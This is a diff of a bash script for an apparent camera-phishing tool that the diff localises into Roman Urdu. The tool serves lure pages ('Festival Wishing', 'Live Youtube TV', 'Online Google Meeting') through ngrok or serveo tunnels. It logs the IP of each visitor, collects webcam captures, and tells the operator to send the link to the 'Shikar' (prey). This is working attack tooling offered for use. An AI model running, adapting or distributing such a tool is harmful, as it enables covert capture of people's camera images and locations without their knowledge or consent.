@@ -26,7 +26,7 @@ printf "\n"
 dependencies() {
 
 
-command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
+command -v php > /dev/null 2>&1 || { echo >&2 "-php- install krne ki zarorat hai. Lehaza install kre. KhudaHafiz."; exit 1; }
  
 
 
@@ -66,12 +66,12 @@ cat ip.txt >> saved.ip.txt
 checkfound() {
 
 printf "\n"
-printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting targets,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Shikar ka instezaar kre,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
 while [ true ]; do
 
 
 if [[ -e "ip.txt" ]]; then
-printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\n"
+printf "\n\e[1;92m[\e[0m+\e[1;92m] Shikar ne link open krlia ha!\n"
 catch_ip
 rm -rf ip.txt
 
@@ -80,7 +80,7 @@ fi
 sleep 0.5
 
 if [[ -e "Log.log" ]]; then
-printf "\n\e[1;92m[\e[0m+\e[1;92m] Cam file received!\e[0m\n"
+printf "\n\e[1;92m[\e[0m+\e[1;92m] Shikar ki Tasweer phnch gai!\e[0m\n"
 rm -rf Log.log
 fi
 sleep 0.5
@@ -92,7 +92,7 @@ done
 
 server() {
 
-command -v ssh > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }
+command -v ssh > /dev/null 2>&1 || { echo >&2 "-ssh- install krne ki zarorat hai. Install kre. KhudaHafiz."; exit 1; }
 
 printf "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Starting Serveo...\e[0m\n"
 
@@ -115,7 +115,7 @@ fuser -k 3333/tcp > /dev/null 2>&1
 php -S localhost:3333 > /dev/null 2>&1 &
 sleep 3
 send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
-printf '\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Direct link:\e[0m\e[1;77m %s\n' $send_link
+printf '\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Direct link yaha hai:\e[0m\e[1;77m %s\n' $send_link
 
 }
 
@@ -139,28 +139,28 @@ rm -rf index3.html
 
 select_template() {
 if [ $option_server -gt 2 ] || [ $option_server -lt 1 ]; then
-printf "\e[1;93m [!] Invalid tunnel option! try again\e[0m\n"
+printf "\e[1;93m [!] Sahi option ka intekhaab kre. Dobara Koshish kre\e[0m\n"
 sleep 1
 clear
 banner
 camphish
 else
-printf "\n-----Choose a template----\n"    
+printf "\n-----template ka intekhaab kre----\n"    
 printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Festival Wishing\e[0m\n"
 printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Live Youtube TV\e[0m\n"
-printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;93m Online Meeting\e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;93m Online Google Meeting\e[0m\n"
 default_option_template="1"
-read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a template: [Default is 1] \e[0m' option_tem
+read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] template ka intekhaab kre: [Default is 1] \e[0m' option_tem
 option_tem="${option_tem:-${default_option_template}}"
 if [[ $option_tem -eq 1 ]]; then
-read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter festival name: \e[0m' fest_name
+read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] festival ke naam ka inderaaj kre: \e[0m' fest_name
 fest_name="${fest_name//[[:space:]]/}"
 elif [[ $option_tem -eq 2 ]]; then
-read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter YouTube video watch ID: \e[0m' yt_video_ID
+read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] YouTube video watch ID ka inderaaj kre: \e[0m' yt_video_ID
 elif [[ $option_tem -eq 3 ]]; then
 printf ""
 else
-printf "\e[1;93m [!] Invalid template option! try again\e[0m\n"
+printf "\e[1;93m [!] template ka intekhaab ghalat hai - phirse koshish kre\e[0m\n"
 sleep 1
 select_template
 fi
@@ -173,9 +173,9 @@ ngrok_server() {
 if [[ -e ngrok ]]; then
 echo ""
 else
-command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
-command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
-printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Ngrok...\n"
+command -v unzip > /dev/null 2>&1 || { echo >&2 "unzip ki zarorat hai -lehaza install kre. KhudaHafiz."; exit 1; }
+command -v wget > /dev/null 2>&1 || { echo >&2 "wget ki zarorat hai - lehaza install kre. KhudaHafiz."; exit 1; }
+printf "\e[1;92m[\e[0m+\e[1;92m] Ngrok download ho raha ha - intezaar kejeye...\n"
 arch=$(uname -a | grep -o 'arm' | head -n1)
 arch2=$(uname -a | grep -o 'Android' | head -n1)
 if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
@@ -186,7 +186,7 @@ unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
 chmod +x ngrok
 rm -rf ngrok-stable-linux-arm.zip
 else
-printf "\e[1;93m[!] Download error... Termux, run:\e[0m\e[1;77m pkg install wget\e[0m\n"
+printf "\e[1;93m[!] Downloading me masla ha... Termux app se type kejeye:\e[0m\e[1;77m pkg install wget\e[0m\n"
 exit 1
 fi
 
@@ -197,7 +197,7 @@ unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
 chmod +x ngrok
 rm -rf ngrok-stable-linux-386.zip
 else
-printf "\e[1;93m[!] Download error... \e[0m\n"
+printf "\e[1;93m[!] Downloading me masla ha... \e[0m\n"
 exit 1
 fi
 fi
@@ -205,33 +205,33 @@ fi
 if [[ -e ~/.ngrok2/ngrok.yml ]]; then
 printf "\e[1;93m[\e[0m*\e[1;93m] your ngrok "
 cat  ~/.ngrok2/ngrok.yml
-read -p $'\n\e[1;92m[\e[0m+\e[1;92m] Do you want to change your ngrok authtoken? [Y/n]:\e[0m ' chg_token
+read -p $'\n\e[1;92m[\e[0m+\e[1;92m] kya ap ngrok authtoken tabdeel krna chahte hai? [Y/n]:\e[0m ' chg_token
 if [[ $chg_token == "Y" || $chg_token == "y" || $cchg_token == "Yes" || $cchg_token == "yes" ]]; then
-read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter your valid ngrok authtoken: \e[0m' ngrok_auth
+read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] ngrok ke valid authtoken ka inderaaj kejeye: \e[0m' ngrok_auth
 ./ngrok authtoken $ngrok_auth >  /dev/null 2>&1 &
-printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93mAuthtoken has been changed\n"
+printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93mAuthtoken tabdeel kiya jaa chuka hai\n"
 fi
 else
-read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter your valid ngrok authtoken: \e[0m' ngrok_auth
+read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] ngrok ke valid authtoken ka inderaaj kejeye: \e[0m' ngrok_auth
 ./ngrok authtoken $ngrok_auth >  /dev/null 2>&1 &
 fi
-printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
+printf "\e[1;92m[\e[0m+\e[1;92m] php server shuru howa chahta hai...\n"
 php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
 sleep 2
-printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok server...\n"
+printf "\e[1;92m[\e[0m+\e[1;92m] ngrok server shuru howa chahta hai...\n"
 ./ngrok http 3333 > /dev/null 2>&1 &
 sleep 10
 
 link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https://[^/"]*\.ngrok.io')
 if [[ -z "$link" ]]; then
-printf "\e[1;31m[!] Direct link is not generating, check following possible reason  \e[0m\n"
-printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Ngrok authtoken is not valid\n"
-printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m If you are using android, turn hotspot on\n"
-printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Ngrok is already running, run this command killall ngrok\n"
-printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Check your internet connection\n"
+printf "\e[1;31m[!] Direct link agar generate nhe hota, To ye mumkina wajuhaat ho skte hai  \e[0m\n"
+printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Ngrok authtoken ka ideraaj ghalat hai\n"
+printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Agr ap android user hai, apna hotspot on kejeye\n"
+printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Ngrok apke termux pe pehle se mojod hai, to ye command killall ngrok likhe ke dobara shurwat kre\n"
+printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Apna internet connection check kre\n"
 exit 1
 else
-printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link
+printf "\e[1;92m[\e[0m*\e[1;92m] Ye Direct link Copy kr ke Shikar ko bheje:\e[0m\e[1;77m %s\e[0m\n" $link
 fi
 payload_ngrok
 checkfound
@@ -242,22 +242,22 @@ if [[ -e sendlink ]]; then
 rm -rf sendlink
 fi
 
-printf "\n-----Choose tunnel server----\n"    
+printf "\n-----tumnel server ka intekhaab kejeye----\n"    
 printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
 printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Serveo.net\e[0m\n"
 default_option_server="1"
-read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a Port Forwarding option: [Default is 1] \e[0m' option_server
+read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Port Forwarding option ka intekhaab kejeye: [Default is 1] \e[0m' option_server
 option_server="${option_server:-${default_option_server}}"
 select_template
 if [[ $option_server -eq 2 ]]; then
 
-command -v php > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }
+command -v php > /dev/null 2>&1 || { echo >&2 "-ssh- install krne ki zarorat hai. Lehaza install kre. KhudaHafiz."; exit 1; }
 start
 
 elif [[ $option_server -eq 1 ]]; then
 ngrok_server
 else
-printf "\e[1;93m [!] Invalid option!\e[0m\n"
+printf "\e[1;93m [!] option ghalat hai!\e[0m\n"
 sleep 1
 clear
 camphish
@@ -287,7 +287,7 @@ rm -rf index3.html
 start() {
 
 default_choose_sub="Y"
-default_subdomain="saycheese$RANDOM"
+default_subdomain="cam$RANDOM"
 
 printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Choose subdomain? (Default:\e[0m\e[1;77m [Y/n] \e[0m\e[1;33m): \e[0m'
 read choose_sub
